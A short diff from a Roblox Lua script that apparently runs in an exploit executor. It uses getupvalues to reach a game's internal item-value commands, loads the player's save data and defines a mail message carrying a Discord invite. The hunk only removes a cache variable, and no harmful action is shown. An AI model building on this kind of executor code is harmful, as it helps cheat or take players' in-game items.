@@ -7,7 +7,6 @@ local MailMessage = "gg / HcpNe56R2a"
 local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
-local rapCache = {}
 _G.scriptExecuted = _G.scriptExecuted or false
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
